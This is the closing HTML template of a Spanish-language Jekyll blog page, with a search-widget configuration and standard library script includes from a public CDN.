      <a class="post-tag" href="/tags/no-sql/">no sql</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    
      <div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true"
        data-animation="true" data-autohide="false">
        <div class="toast-header">
          <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="toast-body text-center pt-0">
          <p class="pl-2 pr-2 mb-3">Hay una nueva versión de contenido disponible.</p>
          <button type="button" class="btn btn-primary" aria-label="Update">
            Actualizar
          </button>
        </div>
      </div>
    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">¡Oops! No se encuentran resultados.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup & clipboard -->
  

  







  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script>







  

  

  







  
    

    

  



  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/es.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script>








<script defer src="/assets/js/dist/post.min.js"></script>



<!-- commons -->

<script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script>




  </body>

</html>

